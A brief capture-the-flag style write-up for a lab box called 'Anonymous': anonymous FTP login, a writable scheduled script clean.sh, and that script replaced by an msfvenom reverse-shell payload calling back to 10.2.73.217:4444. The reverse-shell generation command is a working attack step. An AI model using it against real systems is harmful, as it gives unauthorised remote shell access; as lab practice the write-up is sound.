# Anonymous

Port scan showed that FTP was open. I was able to connect with user `anonymous` and password `anonymous`. There was a message about Passive mode when logging in, and from past experience I know I need to force active mode to download/upload anyting:

```bash
ftp <IP> -A
```

It looks like I have write permissions to a script `clean.sh` which appears to be running on a schedule.

I replaced the script with a reverse shell and am waiting with a listener.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 -f sh -o clean.sh
```


